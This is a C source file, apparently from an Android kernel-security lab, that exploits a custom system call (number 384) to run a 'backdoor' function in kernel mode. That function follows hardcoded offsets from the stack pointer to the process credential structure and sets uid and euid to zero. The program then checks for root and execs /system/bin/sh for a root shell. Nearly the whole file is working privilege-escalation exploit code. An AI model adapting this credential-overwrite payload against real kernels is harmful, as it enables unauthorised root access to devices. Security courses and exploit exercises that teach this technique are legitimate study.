#include <stdio.h>

// Backdoor function
// NOTE: This function is supposed to execute in kernel space
// Therefore, you should make NO system calls or the kernel will crash
void backdoor() {

    register unsigned long sp asm ("sp");
    unsigned long p_thread_info = sp & ~(8192 - 1);
    unsigned long p_taskp = p_thread_info + 12;
    unsigned long p_credp = *(unsigned long*)p_taskp + 732;

    unsigned long p_uid = *(unsigned long*)p_credp + 4;
    *(unsigned long*)p_uid = 0;

    unsigned long p_euid = *(unsigned long*)p_credp + 20;
    *(unsigned long*)p_euid = 0;

    return;
}

int main() {
    // Initial getuid(), should return non zero
    fprintf(stderr, "getuid() = %d\n", getuid());

    // Run the exploit    
    // You will need to use provided system calls to execute the backdoor() function in kernel mode 
    printf("%x\n",syscall(384,1,0));
    syscall(384,2,0);
    printf("%x\n",syscall(384,3,&backdoor));
    printf("%x\n",syscall(384,4,0));
    // If the exploit is successful, getuid() should return zero.
    fprintf(stderr, "getuid() = %d\n", getuid());

    if (getuid() == 0) {
        fprintf(stderr, "Trying to get a root shell.\n");
        char * sharg[] = {"/system/bin/sh", NULL};
        execv("/system/bin/sh", sharg); // You should see '#' at this point
    }

    return 0;
}
